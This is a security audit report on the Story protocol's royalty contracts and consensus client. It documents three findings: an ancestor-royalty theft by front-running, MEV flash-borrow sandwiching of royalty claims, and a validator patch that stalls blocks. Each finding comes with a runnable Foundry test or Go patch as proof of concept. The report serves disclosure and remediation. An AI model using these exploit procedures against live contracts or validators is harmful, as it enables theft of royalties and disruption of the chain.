
# Story

## Findings Summary


| ID | Description | Severity |
|----|-------------|----------|
| [H-01](#h-01-malicious-child-ip-can-steal-the-assets-from-ancestor-ips) | Malicious child IP can steal the assets from ancestor IPs | High |
| [M-01](#m-01-royalty-payment-txs-can-be-arbitraged-by-mev-to-claim-revenue) | Royalty payment txs can be arbitraged by MEV to claim revenue | Medium |
| [M-02](#m-02-malicious-validator-can-halt-the-chain-by-crafting-a-malicious-proposal) | Malicious validator can halt the chain by crafting a malicious proposal | Medium |



### <a name="h-01-malicious-child-ip-can-steal-the-assets-from-ancestor-ips"></a> [H-01] Malicious child IP can steal the assets from ancestor IPs

**Description**:

When users pay royalty to the child IP by calling `payRoyaltyOnBehalf()`, the tokens are first sent to the child IP vault and held within the LRP contract. Ancestor IP vaults only receive their proportional share after explicitly calling `transferToVault()` in descendant order. The current logic caches `ancestorPercentLRP[ipId][ancestorIpId]` on the first transfer and then transfers `maxAmount - transferredAmount` without accounting for ancestors further up the chain.

```solidity
function transferToVault(
	address ipId,
	address ancestorIpId,
	address token
) external whenNotPaused returns (uint256) {
	RoyaltyPolicyLRPStorage storage $ = _getRoyaltyPolicyLRPStorage();

	uint32 ancestorPercent = $.ancestorPercentLRP[ipId][ancestorIpId];
	if (ancestorPercent == 0) {
		// @audit - get the ancestor percent from ipId to ancestorIpId
		// on the first transfer to a vault from a specific descendant the royalty between the two is set
		ancestorPercent = _getRoyaltyLRP(ipId, ancestorIpId);
		if (ancestorPercent == 0) revert Errors.RoyaltyPolicyLRP__ZeroClaimableRoyalty();
		$.ancestorPercentLRP[ipId][ancestorIpId] = ancestorPercent;
	}

	// calculate the amount to transfer
	IRoyaltyModule royaltyModule = ROYALTY_MODULE;
	uint256 totalRevenueTokens = royaltyModule.totalRevenueTokensReceived(ipId, token);
	uint256 maxAmount = (totalRevenueTokens * ancestorPercent) / royaltyModule.maxPercent();
	uint256 transferredAmount = $.transferredTokenLRP[ipId][ancestorIpId][token];
	uint256 amountToTransfer = Math.min(maxAmount - transferredAmount, IERC20(token).balanceOf(address(this)));

	// make the revenue token transfer
	$.transferredTokenLRP[ipId][ancestorIpId][token] += amountToTransfer;
	address ancestorIpRoyaltyVault = royaltyModule.ipRoyaltyVaults(ancestorIpId);
	IIpRoyaltyVault(ancestorIpRoyaltyVault).updateVaultBalance(token, amountToTransfer);
	IERC20(token).safeTransfer(ancestorIpRoyaltyVault, amountToTransfer);

	emit RevenueTransferredToVault(ipId, ancestorIpId, token, amountToTransfer);
	return amountToTransfer;
}
```

For a hierarchy `IP1 -> IP2 -> IP3` with 10% royalty per edge, `IP1` should ultimately get 1% of `IP3`'s royalties and `IP2` should get 9%. If `IP1` calls `transferToVault()` first, the distribution is correct.

When `IP2` front-runs `IP1`, it pulls the entire 10% share before `IP1` can claim. Subsequent calls by `IP1` revert because [`amountToTransfer`](https://github.com/storyprotocol/protocol-core-v1/blob/1505d7952bbd248ecaceb7427768dda2ebc75ad3/contracts/modules/royalty/policies/LRP/RoyaltyPolicyLRP.sol#L176) becomes zero and `IpRoyaltyVault._updateVaultBalance()` reverts [here](https://github.com/storyprotocol/protocol-core-v1/blob/1505d7952bbd248ecaceb7427768dda2ebc75ad3/contracts/modules/royalty/policies/IpRoyaltyVault.sol#L226). This allows a malicious child IP to steal the ancestor's royalty share.

**Proof of Concept**:

Insert the following case into `RoyaltyPolicyLRP.t.sol`:

```solidity
function test_RoyaltyPolicyLRP_transferToVault_disOrder_revert() public {
	address[] memory parents = new address[](1);
	address[] memory licenseRoyaltyPolicies = new address[](1);
	uint32[] memory parentRoyalties = new uint32[](1);
	parents[0] = address(100);
	licenseRoyaltyPolicies[0] = address(royaltyPolicyLRP);
	parentRoyalties[0] = uint32(10 * 10 ** 6);

	// link 101 to 100
	ipGraph.addParentIp(address(101), parents);
	vm.startPrank(address(licensingModule));
	royaltyModule.onLinkToParents(address(101), parents, licenseRoyaltyPolicies, parentRoyalties, "", 100e6);
	royaltyModule.onLicenseMinting(address(101), address(royaltyPolicyLRP), uint32(10 * 10 ** 6), "");

	parents = ipGraph.getParentIps(address(101));
	assertEq(parents.length, 1);
	assertEq(parents[0], address(100));
	assertEq(1, ipGraph.getAncestorIpsCount(address(101)));
	assertEq(0, ipGraph.getParentIps(address(100)).length);

	// link 102 to 101
	parents[0] = address(101);
	ipGraph.addParentIp(address(102), parents);
	royaltyModule.onLinkToParents(address(102), parents, licenseRoyaltyPolicies, parentRoyalties, "", 100e6);
	royaltyModule.onLicenseMinting(address(102), address(royaltyPolicyLRP), uint32(10 * 10 ** 6), "");

	// link 103 to 102
	parents[0] = address(102);
	ipGraph.addParentIp(address(103), parents);
	royaltyModule.onLinkToParents(address(103), parents, licenseRoyaltyPolicies, parentRoyalties, "", 100e6);
	royaltyModule.onLicenseMinting(address(103), address(royaltyPolicyLRP), uint32(10 * 10 ** 6), "");

	assertEq(royaltyPolicyLRP.getPolicyRoyalty(address(102), address(101)), 10 * 10 ** 6);
	assertEq(royaltyPolicyLRP.getPolicyRoyalty(address(103), address(102)), 10 * 10 ** 6);

	// 1. make payment to address(103) 100 usdc by calling payRoyaltyOnBehalf
	uint256 royaltyAmount = 100 * 10 ** 6;
	address payerIpId = address(3);
	vm.startPrank(payerIpId);
	USDC.mint(payerIpId, royaltyAmount);
	USDC.approve(address(royaltyModule), royaltyAmount);
	royaltyModule.payRoyaltyOnBehalf(address(103), payerIpId, address(USDC), royaltyAmount);
	vm.stopPrank();
	assertEq(10 * 1e6, USDC.balanceOf(address(royaltyPolicyLRP)));

	// save to snaposhot.
	uint256 snapshot = vm.snapshot();

	// below test firstly call transferToVault to 101 vault then transfer to 102 vault.
	// 2. transferToVault between 103 and 101 first, address(101) should get (10%*10%=1%) total royalty.
	assertEq(royaltyModule.totalRevenueTokensReceived(address(102), address(USDC)), 0);
	// vm.expectRevert(Errors.IpRoyaltyVault__ZeroAmount.selector);
	royaltyPolicyLRP.transferToVault(address(103), address(101), address(USDC));
	assertEq(9 * 1e6, USDC.balanceOf(address(royaltyPolicyLRP)));

	// 3. transferToVault between 103 and 102, address(102) should get (10% - 10%*10%=9%) total royalty.
	royaltyPolicyLRP.transferToVault(address(103), address(102), address(USDC));
	assertEq(0, USDC.balanceOf(address(royaltyPolicyLRP)));
	
	uint256 ipId101VaultUsdcBalance = IERC20(USDC).balanceOf(royaltyModule.ipRoyaltyVaults(address(101)));
	uint256 ipId102VaultUsdcBalance = IERC20(USDC).balanceOf(royaltyModule.ipRoyaltyVaults(address(102)));
	uint256 ipId103VaultUsdcBalance = IERC20(USDC).balanceOf(royaltyModule.ipRoyaltyVaults(address(103)));
	// below asset is correct because 101_vault = 100 * 10% * 10% = 1 USDC, 102_vault = 100 * 10% * 90% = 9 USDC, 103_vault = 100 - 9 - 1 = 90 USDC
	assertEq(1 * 1e6, ipId101VaultUsdcBalance);
	assertEq(9 * 1e6, ipId102VaultUsdcBalance);
	assertEq(90 * 1e6, ipId103VaultUsdcBalance);

	// revert to snapshot then test firstly call transferToVault to 102 vault then transfer to 101 vault.
	vm.revertTo(snapshot);
	assertEq(10 * 1e6, USDC.balanceOf(address(royaltyPolicyLRP)));

	// below test firstly call transferToVault to 102 vault then transfer to 101 vault.
	// 2. transferToVault between 103 and 102 first.
	assertEq(royaltyModule.totalRevenueTokensReceived(address(101), address(USDC)), 0);
	royaltyPolicyLRP.transferToVault(address(103), address(102), address(USDC));
	// this asset is incorrect because 102_vault should get 100 * 10% * 90% = 9 USDC, 101_vault = 100 * 10% * 10% = 1 USDC.
	// it means that if 102 ip call transferToVault first, they can steal 101 ip's royalty fee.
	assertEq(0, USDC.balanceOf(address(royaltyPolicyLRP)));

	// 3. transferToVault between 103 and 101, it would revert because the LRP contract token is 0 now.
	vm.expectRevert(Errors.IpRoyaltyVault__ZeroAmount.selector);
	royaltyPolicyLRP.transferToVault(address(103), address(101), address(USDC));

	ipId101VaultUsdcBalance = IERC20(USDC).balanceOf(royaltyModule.ipRoyaltyVaults(address(101)));
	ipId102VaultUsdcBalance = IERC20(USDC).balanceOf(royaltyModule.ipRoyaltyVaults(address(102)));
	ipId103VaultUsdcBalance = IERC20(USDC).balanceOf(royaltyModule.ipRoyaltyVaults(address(103)));
	assertEq(0 * 1e6, ipId101VaultUsdcBalance);
	assertEq(10 * 1e6, ipId102VaultUsdcBalance);
	assertEq(90 * 1e6, ipId103VaultUsdcBalance);
}
```

**Recommendation**:

Ensure `amountToTransfer` accounts for upstream ancestors regardless of call order so each ancestor receives its allocation before descendants can drain the contract.


### <a name="m-01-royalty-payment-txs-can-be-arbitraged-by-mev-to-claim-revenue"></a> M-01: Royalty payment txs can be arbitraged by MEV to claim revenue

**Description**:

`payRoyaltyOnBehalf()` deposits tokens to the receiver vault, which updates balances via [`receiverVault.updateVaultBalance()`](https://github.com/storyprotocol/protocol-core-v1/blob/1505d7952bbd248ecaceb7427768dda2ebc75ad3/contracts/modules/royalty/RoyaltyModule.sol#L692). Any `IpRoyaltyVault` holder can then call `claimRevenueOnBehalf()` to withdraw their share computed as `int256((accBalance * userAmount) / totalSupply()) - rewardDebt`.

RTs are transferable ERC-20 tokens per the [official doc](https://docs.story.foundation/docs/ip-royalty-vault), meaning they can be traded, lent, or flash-borrowed. MEV bots can monitor pending royalty payments, borrow RTs immediately before execution, claim the new revenue, and repay the RTs within the same block, diluting long-term holders.

**Impact Explanation**:

High. Large flash positions can siphon a disproportionate share of royalties, leaving honest holders undercompensated.

**Likelihood Explanation**:

High once RTs are liquid on secondary markets; monitoring mempool transactions is trivial for MEV bots.

**Proof of Concept**:

Insert into `test/foundry/modules/royalty/IpRoyaltyVault.t.sol`:

```solidity
function test_IpRoyaltyVault_sandwich_payRev_get_profit() public { 
	// deploy two vaults and send 30% of rts to another address
	uint256 royaltyAmount = 1000 * 10 ** 6;
	USDC.mint(address(1), royaltyAmount * 2); // 2000 USDC
	vm.startPrank(address(licensingModule));
	royaltyModule.onLicenseMinting(address(2), address(royaltyPolicyLAP), uint32(10 * 10 ** 6), "");
	IpRoyaltyVault ipRoyaltyVault = IpRoyaltyVault(royaltyModule.ipRoyaltyVaults(address(2)));
	vm.stopPrank();

	address lender = makeAddr("lender");
	vm.startPrank(address(2));
	IERC20(address(ipRoyaltyVault)).transfer(alice, 10e6);
	IERC20(address(ipRoyaltyVault)).transfer(lender, 20e6);
	vm.stopPrank();
	assertEq(ipRoyaltyVault.balanceOf(alice), 10e6);
	assertEq(ipRoyaltyVault.balanceOf(lender), 20e6);

	// payment is made to vault
	vm.startPrank(address(1));
	USDC.approve(address(royaltyModule), royaltyAmount);
	royaltyModule.payRoyaltyOnBehalf(address(2), address(1), address(USDC), royaltyAmount);

	address[] memory tokens = new address[](1);
	tokens[0] = address(USDC);

	assertEq(ipRoyaltyVault.claimableRevenue(address(2), address(USDC)), (royaltyAmount * 70e6) / 100e6);
	assertEq(ipRoyaltyVault.claimableRevenue(alice, address(USDC)), (royaltyAmount * 10e6) / 100e6);
	assertEq(ipRoyaltyVault.claimableRevenue(lender, address(USDC)), (royaltyAmount * 20e6) / 100e6);

	// alice as normal users to claim the revenue
	uint256 aliceUsdcBalanceBefore = USDC.balanceOf(alice);
	vm.expectEmit(address(ipRoyaltyVault));
	emit IIpRoyaltyVault.RevenueTokenClaimed(alice, address(USDC), (royaltyAmount * 10e6) / 100e6);
	uint256 aliceClaimedUsdc = ipRoyaltyVault.claimRevenueOnBehalf(alice, address(USDC));

	assertEq(aliceClaimedUsdc, (royaltyAmount * 10e6) / 100e6);
	assertEq(USDC.balanceOf(alice), aliceUsdcBalanceBefore + (royaltyAmount * 10e6) / 100e6);
	assertEq(USDC.balanceOf(address(ipRoyaltyVault)), (royaltyAmount * 90e6) / 100e6);

	// arbitrager monitor the mempool and watch some users pay royalty to the vault
	// arbitrager front-run the payRoyaltyOnBehalf tx and borrow all RTs from the lender
	address arbitrager = makeAddr("arbitrager");
	vm.startPrank(lender);
	IERC20(address(ipRoyaltyVault)).transfer(arbitrager, ipRoyaltyVault.balanceOf(lender));
	vm.stopPrank();
	assertEq(20e6, ipRoyaltyVault.balanceOf(arbitrager));
	assertEq(ipRoyaltyVault.claimableRevenue(arbitrager, address(USDC)), 0);

	// after that the user pay royalty to the vault
	vm.startPrank(address(1));
	USDC.approve(address(royaltyModule), royaltyAmount);
	royaltyModule.payRoyaltyOnBehalf(address(2), address(1), address(USDC), royaltyAmount);
	vm.stopPrank();

	// arbitrager claimable revenue gt than 0.
	assert(ipRoyaltyVault.claimableRevenue(arbitrager, address(USDC)) > 0);

	// arbitrager claim revenue
	vm.expectEmit(address(ipRoyaltyVault));
	emit IIpRoyaltyVault.RevenueTokenClaimed(arbitrager, address(USDC), (royaltyAmount * 20e6) / 100e6);
	vm.startPrank(arbitrager);
	ipRoyaltyVault.claimRevenueOnBehalf(arbitrager, address(USDC));

	// transfer the borrow RTs to the lender immediately after claim the revenue
	IERC20(address(ipRoyaltyVault)).transfer(lender, ipRoyaltyVault.balanceOf(arbitrager));
	assertEq(ipRoyaltyVault.balanceOf(arbitrager), 0);
	assertEq(ipRoyaltyVault.balanceOf(lender), 20e6);

	// finally get the profit by sandwich attack
	assertEq(USDC.balanceOf(arbitrager), 200e6);
}
```

**Recommendation**:

1. Introduce a cooldown or holding-period check inside `IpRoyaltyVault._update()` so freshly transferred RTs cannot immediately claim.
2. Consider weighting revenue based on holding duration to disincentivize flash claims.


### <a name="m-02-malicious-validator-can-halt-the-chain-by-crafting-a-malicious-proposal"></a> M-02: Malicious validator can halt the chain by crafting a malicious proposal

**Description**:

[`proposal_server.go#ExecutionPayload`](https://github.com/piplabs/story/blob/2760c5868c3445f2ae395af829825df399131690/client/x/evmengine/keeper/proposal_server.go#L32-L49) retries when the execution engine returns an error. It forwards payloads to [`engineCl.NewPayloadV3`](https://github.com/ethereum/go-ethereum/blob/a1093d98eb3260f2abf340903c2d968b2b891c11/eth/catalyst/api.go#L590-L606), which rejects Cancun payloads that omit mandatory fields such as `ExcessBlobGas` or `BlobGasUsed`.

A malicious proposer can intentionally clear these fields so every validator enters the retry loop. Story inherited Omni's mitigation of retrying for up to 10 seconds, stretching block production from roughly 3 seconds to ~12 seconds whenever the malicious validator proposes.

```go
func (api *ConsensusAPI) NewPayloadV3(params engine.ExecutableData, versionedHashes []common.Hash, beaconRoot *common.Hash) (engine.PayloadStatusV1, error) {
	if params.Withdrawals == nil {
		return engine.PayloadStatusV1{Status: engine.INVALID}, engine.InvalidParams.With(errors.New("nil withdrawals post-shanghai"))
	}
    //@audit - if ExcessBlobGas or BlobGasUsed is nil, return an error
	if params.ExcessBlobGas == nil {
		return engine.PayloadStatusV1{Status: engine.INVALID}, engine.InvalidParams.With(errors.New("nil excessBlobGas post-cancun"))
	}
	if params.BlobGasUsed == nil {
		return engine.PayloadStatusV1{Status: engine.INVALID}, engine.InvalidParams.With(errors.New("nil blobGasUsed post-cancun"))
	}

	if versionedHashes == nil {
		return engine.PayloadStatusV1{Status: engine.INVALID}, engine.InvalidParams.With(errors.New("nil versionedHashes post-cancun"))
	}
	if beaconRoot == nil {
		return engine.PayloadStatusV1{Status: engine.INVALID}, engine.InvalidParams.With(errors.New("nil beaconRoot post-cancun"))
	}

	if api.eth.BlockChain().Config().LatestFork(params.Timestamp) != forks.Cancun {
		return engine.PayloadStatusV1{Status: engine.INVALID}, engine.UnsupportedFork.With(errors.New("newPayloadV3 must only be called for cancun payloads"))
	}
	return api.newPayload(params, versionedHashes, beaconRoot, nil, false)
}
```


**Proof of Concept**:

Apply the following patch and run the Story localnet per https://github.com/piplabs/story-localnet:

```diff
diff --git a/client/x/evmengine/keeper/abci.go b/client/x/evmengine/keeper/abci.go
index 89d306f..e0fe2d6 100644
--- a/client/x/evmengine/keeper/abci.go
+++ b/client/x/evmengine/keeper/abci.go
@@ -3,7 +3,9 @@ package keeper
 import (
 	"context"
 	"encoding/json"
+	"fmt"
 	"log/slog"
+	"os"
 	"strings"
 	"time"
 
@@ -124,6 +126,26 @@ func (k *Keeper) PrepareProposal(ctx sdk.Context, req *abci.RequestPreparePropos
 		return nil, err
 	}
 
+	// read config file to check if validator-2 is present
+	isValidator_02 := false
+	configPath := "/root/.story/story/config/config.toml"
+	configData, err := os.ReadFile(configPath)
+	if err != nil {
+		log.Error(ctx, "Failed to read config file", err)
+	} else {
+		configContent := string(configData)
+		if strings.Contains(configContent, "validator-2") {
+			isValidator_02 = true
+			log.Info(ctx, "xxxxxxxx Found matching moniker validator-2 in config")
+		}
+	}
+	fmt.Println("isValidator_02: ", isValidator_02)
+
+	// @audit - test issue BlobGasUsed == nil when malicious proposer is validator-2 cause retry 10s after height 20.
+	if req.Height >= 20 && isValidator_02 {
+		payloadResp.ExecutionPayload.BlobGasUsed = nil
+	}
+
 	// Create execution payload message
 	payloadData, err := json.Marshal(payloadResp.ExecutionPayload)
 	if err != nil {
```

Result:

```md
24-12-19 08:31:07.188 DEBU Started non-optimistic payload           height=59 payload=0x030e724d59e8d04a
isValidator_02:  false
24-12-19 08:31:07.794 INFO Proposing new block                      height=59 execution_block_hash=5d730f3 evm_events=0
24-12-19 08:31:07.804 INFO 👾 ABCI call: ProcessProposal            height=59 proposer=7efaecc
24-12-19 08:31:07.804 DEBU Comparing local and received withdrawals local=0 received=0
24-12-19 08:31:08.122 INFO 👾 ABCI call: FinalizeBlock              height=59 proposer=7efaecc
24-12-19 08:31:08.122 DEBU Skip minting during singularity         
24-12-19 08:31:08.124 DEBU Dequeueing eligible withdrawals [BEFORE] total_len=0
24-12-19 08:31:08.124 DEBU Dequeueing eligible withdrawals [AFTER]  total_len=0 withdrawals_len=0
24-12-19 08:31:08.124 DEBU Dequeueing eligible reward withdrawals [BEFORE] total_len=0 withdrawals_len=0
24-12-19 08:31:08.124 DEBU Dequeueing eligible reward withdrawals [AFTER] total_len=0 withdrawals_len=0 reward_withdrawals_len=0
24-12-19 08:31:08.133 DEBU Processed staking events                 height=57 count=0
24-12-19 08:31:08.133 DEBU Processed governance events              height=57 count=0
24-12-19 08:31:08.133 DEBU Processed UBIPool events                 height=57 count=0
24-12-19 08:31:08.134 DEBU EndBlock.evmstaking                     
24-12-19 08:31:08.135 DEBU hash of all writes                       workingHash=F42871061CC0AA0CB6ADC8FBA3995FEF702D0BB0D62EBB13F5E1611317A80A0A
24-12-19 08:31:08.135 INFO 👾 ABCI response: FinalizeBlock          val_updates=0 height=59
24-12-19 08:31:08.140 INFO 👾 ABCI call: Commit                    
24-12-19 08:31:08.142 DEBU prune start                              height=59
24-12-19 08:31:08.142 DEBU pruning skipped, height is less than or equal to 0
24-12-19 08:31:08.142 DEBU prune end                                height=59
24-12-19 08:31:08.142 DEBU flushing metadata                        height=59
24-12-19 08:31:08.147 DEBU flushing metadata finished               height=59
24-12-19 08:31:08.147 DEBU snapshot is skipped                      height=59
24-12-19 08:31:10.835 INFO 👾 ABCI call: ProcessProposal            height=60 proposer=ee8e45b
24-12-19 08:31:10.835 DEBU Comparing local and received withdrawals local=0 received=0
24-12-19 08:31:11.062 INFO 👾 ABCI call: FinalizeBlock              height=60 proposer=ee8e45b
24-12-19 08:31:11.063 DEBU Skip minting during singularity         
24-12-19 08:31:11.064 DEBU Dequeueing eligible withdrawals [BEFORE] total_len=0
24-12-19 08:31:11.064 DEBU Dequeueing eligible withdrawals [AFTER]  total_len=0 withdrawals_len=0
24-12-19 08:31:11.064 DEBU Dequeueing eligible reward withdrawals [BEFORE] total_len=0 withdrawals_len=0
24-12-19 08:31:11.064 DEBU Dequeueing eligible reward withdrawals [AFTER] total_len=0 withdrawals_len=0 reward_withdrawals_len=0
24-12-19 08:31:11.079 DEBU Processed staking events                 height=58 count=0
24-12-19 08:31:11.079 DEBU Processed governance events              height=58 count=0
24-12-19 08:31:11.079 DEBU Processed UBIPool events                 height=58 count=0
24-12-19 08:31:11.079 DEBU EndBlock.evmstaking                     
24-12-19 08:31:11.080 DEBU hash of all writes                       workingHash=FA2038572F87633298765E244A01FE592ACF289863DE96475BBA5B2120668774
24-12-19 08:31:11.080 INFO 👾 ABCI response: FinalizeBlock          val_updates=0 height=60
24-12-19 08:31:11.085 INFO 👾 ABCI call: Commit                    
24-12-19 08:31:11.093 DEBU prune start                              height=60
24-12-19 08:31:11.093 DEBU pruning skipped, height is less than or equal to 0
24-12-19 08:31:11.093 DEBU prune end                                height=60
24-12-19 08:31:11.093 DEBU flushing metadata                        height=60
24-12-19 08:31:11.106 DEBU flushing metadata finished               height=60
24-12-19 08:31:11.108 DEBU snapshot is skipped                      height=60
24-12-19 08:31:13.771 INFO 👾 ABCI call: ProcessProposal            height=61 proposer=3dd8cba
24-12-19 08:31:13.772 DEBU Comparing local and received withdrawals local=0 received=0
24-12-19 08:31:13.774 WARN Verifying proposal failed: push new payload to evm (will retry) err="new payload: rpc new payload v3: Invalid parameters" stacktrace="[errors.go:39 engineclient.go:94 msg_server.go:173 proposal_server.go:34 helpers.go:30 proposal_server.go:33 tx.pb.go:301 msg_service_router.go:175 tx.pb.go:303 msg_service_router.go:198 prouter.go:93 abci.go:520 cmt_abci.go:40 abci.go:85 local_client.go:164 app_conn.go:89 execution.go:166 state.go:1381 state.go:1338 state.go:2055 state.go:910 state.go:836 asm_arm64.s:1222]"
24-12-19 08:31:14.776 WARN Verifying proposal failed: push new payload to evm (will retry) err="new payload: rpc new payload v3: Invalid parameters" stacktrace="[errors.go:39 engineclient.go:94 msg_server.go:173 proposal_server.go:34 helpers.go:30 proposal_server.go:33 tx.pb.go:301 msg_service_router.go:175 tx.pb.go:303 msg_service_router.go:198 prouter.go:93 abci.go:520 cmt_abci.go:40 abci.go:85 local_client.go:164 app_conn.go:89 execution.go:166 state.go:1381 state.go:1338 state.go:2055 state.go:910 state.go:836 asm_arm64.s:1222]"
24-12-19 08:31:16.558 WARN Verifying proposal failed: push new payload to evm (will retry) err="new payload: rpc new payload v3: Invalid parameters" stacktrace="[errors.go:39 engineclient.go:94 msg_server.go:173 proposal_server.go:34 helpers.go:30 proposal_server.go:33 tx.pb.go:301 msg_service_router.go:175 tx.pb.go:303 msg_service_router.go:198 prouter.go:93 abci.go:520 cmt_abci.go:40 abci.go:85 local_client.go:164 app_conn.go:89 execution.go:166 state.go:1381 state.go:1338 state.go:2055 state.go:910 state.go:836 asm_arm64.s:1222]"
24-12-19 08:31:18.684 WARN Verifying proposal failed: push new payload to evm (will retry) err="new payload: rpc new payload v3: Invalid parameters" stacktrace="[errors.go:39 engineclient.go:94 msg_server.go:173 proposal_server.go:34 helpers.go:30 proposal_server.go:33 tx.pb.go:301 msg_service_router.go:175 tx.pb.go:303 msg_service_router.go:198 prouter.go:93 abci.go:520 cmt_abci.go:40 abci.go:85 local_client.go:164 app_conn.go:89 execution.go:166 state.go:1381 state.go:1338 state.go:2055 state.go:910 state.go:836 asm_arm64.s:1222]"
24-12-19 08:31:23.415 WARN Verifying proposal failed: push new payload to evm (will retry) err="new payload: rpc new payload v3: Invalid parameters" stacktrace="[errors.go:39 engineclient.go:94 msg_server.go:173 proposal_server.go:34 helpers.go:30 proposal_server.go:33 tx.pb.go:301 msg_service_router.go:175 tx.pb.go:303 msg_service_router.go:198 prouter.go:93 abci.go:520 cmt_abci.go:40 abci.go:85 local_client.go:164 app_conn.go:89 execution.go:166 state.go:1381 state.go:1338 state.go:2055 state.go:910 state.go:836 asm_arm64.s:1222]"
24-12-19 08:31:23.772 WARN Verifying proposal failed: push new payload to evm (will retry) err="new payload: rpc new payload v3: Post \"http://validator3-geth:8551\": round trip: context deadline exceeded" stacktrace="[errors.go:39 jwt.go:41 client.go:259 client.go:180 client.go:724 client.go:590 http.go:229 http.go:173 client.go:351 engineclient.go:84 msg_server.go:173 proposal_server.go:34 helpers.go:30 proposal_server.go:33 tx.pb.go:301 msg_service_router.go:175 tx.pb.go:303 msg_service_router.go:198 prouter.go:93 abci.go:520 cmt_abci.go:40 abci.go:85 local_client.go:164 app_conn.go:89 execution.go:166 state.go:1381 state.go:1338 state.go:2055 state.go:910 state.go:836 asm_arm64.s:1222]"
24-12-19 08:31:23.773 ERRO Rejecting process proposal               err="execute message: retry canceled: context deadline exceeded" stacktrace="[errors.go:39 helpers.go:33 proposal_server.go:33 tx.pb.go:301 msg_service_router.go:175 tx.pb.go:303 msg_service_router.go:198 prouter.go:93 abci.go:520 cmt_abci.go:40 abci.go:85 local_client.go:164 app_conn.go:89 execution.go:166 state.go:1381 state.go:1338 state.go:2055 state.go:910 state.go:836 asm_arm64.s:1222]"
24-12-19 08:31:23.773 ERRO prevote step: state machine rejected a proposed block; this should not happen:the proposer may be misbehaving; prevoting nil module=consensus height=61 round=0 err=<nil>
24-12-19 08:31:25.743 INFO 👾 ABCI call: ProcessProposal            height=61 proposer=48dc218
24-12-19 08:31:25.744 DEBU Comparing local and received withdrawals local=0 received=0
24-12-19 08:31:25.968 INFO 👾 ABCI call: FinalizeBlock              height=61 proposer=48dc218
24-12-19 08:31:25.968 DEBU Skip minting during singularity         
24-12-19 08:31:25.980 DEBU Dequeueing eligible withdrawals [BEFORE] total_len=0
24-12-19 08:31:25.980 DEBU Dequeueing eligible withdrawals [AFTER]  total_len=0 withdrawals_len=0
24-12-19 08:31:25.980 DEBU Dequeueing eligible reward withdrawals [BEFORE] total_len=0 withdrawals_len=0
24-12-19 08:31:25.980 DEBU Dequeueing eligible reward withdrawals [AFTER] total_len=0 withdrawals_len=0 reward_withdrawals_len=0
24-12-19 08:31:26.000 DEBU Processed staking events                 height=59 count=0
24-12-19 08:31:26.000 DEBU Processed governance events              height=59 count=0
24-12-19 08:31:26.000 DEBU Processed UBIPool events                 height=59 count=0
24-12-19 08:31:26.003 DEBU EndBlock.evmstaking                     
```

The logs show heights 60-61 normally complete in `08:31:10.835 - 08:31:13.771 = 2.936s`, while the malicious proposal stretches height 61 to `08:31:25.743 - 08:31:13.771 = 11.972s` (~4.1× slower).

**Recommendation**:

Validate `params.Withdrawals`, `params.ExcessBlobGas`, and `params.BlobGasUsed` before entering the retry loop. Reject malformed payloads immediately and cap retries (for example to three attempts) to avoid extended stalls.

